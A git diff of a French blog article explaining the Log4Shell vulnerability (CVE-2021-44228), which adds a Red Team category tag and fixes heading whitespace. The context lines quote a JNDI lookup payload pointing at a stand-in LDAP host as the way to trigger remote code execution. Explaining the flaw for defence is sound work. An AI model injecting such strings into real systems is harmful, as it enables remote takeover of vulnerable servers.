@@ -5,6 +5,7 @@ Title: Log4j, une vulnérabilité d'une ampleur inédite
 Summary: Le 9 décembre 2021, la publication d'une vulnérabilité 0 day baptisée Log4Shell (CVE-2021-44228) a ébranlé le petit monde de la sécurité informatique, nous tacherons de comprendre son fonctionnement et comment s'en prémunir dans cet article.
 Slug: log4j
 Keywords: sécurité
+Category: Cybersécurité/Red Team
 
 Le 9 décembre 2021, la publication d'une vulnérabilité 0 day baptisée Log4Shell ([CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)) a ébranlé le monde de la sécurité informatique, nous tacherons de comprendre son fonctionnement et comment s'en prémunir dans cet article.
 
@@ -12,7 +13,7 @@ Le 9 décembre 2021, la publication d'une vulnérabilité 0 day baptisée Log4S
 
 ![Message de wcc526 "Is it a security vulnerability"](/static/img/log4j/github.webp)
 
-## 💥 Exploitation 
+## 💥 Exploitation
 
 L'exploitation de cette vulnérabilité est triviale, une simple suite de caractères comme `${jndi:ldap://example.com/a}` permet d'obtenir une RCE (Remote Code Execution) sur le serveur distant.
 
